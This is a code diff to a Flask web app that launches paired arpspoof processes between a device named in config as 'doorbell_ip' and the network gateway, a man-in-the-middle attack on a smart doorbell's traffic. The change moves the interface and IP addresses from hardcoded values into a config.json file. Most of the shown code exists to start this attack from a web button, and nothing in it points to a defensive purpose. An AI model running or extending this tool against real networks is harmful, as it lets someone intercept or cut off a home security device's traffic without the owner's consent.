@@ -2,6 +2,16 @@ from flask import Flask, render_template, jsonify
 import subprocess
 import signal
 import os
+import json
+import os
+
+file = "config.json"
+
+
+def read_config():
+    with open(file, "r") as f:
+        return json.load(f)
+
 
 app = Flask(__name__)
 
@@ -22,17 +32,17 @@ def index():
 @app.route("/start", methods=["POST"])
 def start_scripts():
     global router_process, target_process
-
+    config = read_config()
     try:
         if not is_running(router_process):
             router_process = subprocess.Popen(
-                ["arpspoof", "-i", "wlan0", "-t", "192.168.0.1", "192.168.0.236"],
+                ["arpspoof", "-i", config["interface"], "-t", config["doorbell_ip"], config["gateway"]],
                 preexec_fn=os.setsid
             )
 
         if not is_running(target_process):
             target_process = subprocess.Popen(
-                ["arpspoof", "-i", "wlan0", "-t", "192.168.0.236", "192.168.0.1"],
+                ["arpspoof", "-i", config["interface"], "-t", config["gateway"], config["doorbell_ip"]],
                 preexec_fn=os.setsid
             )
 
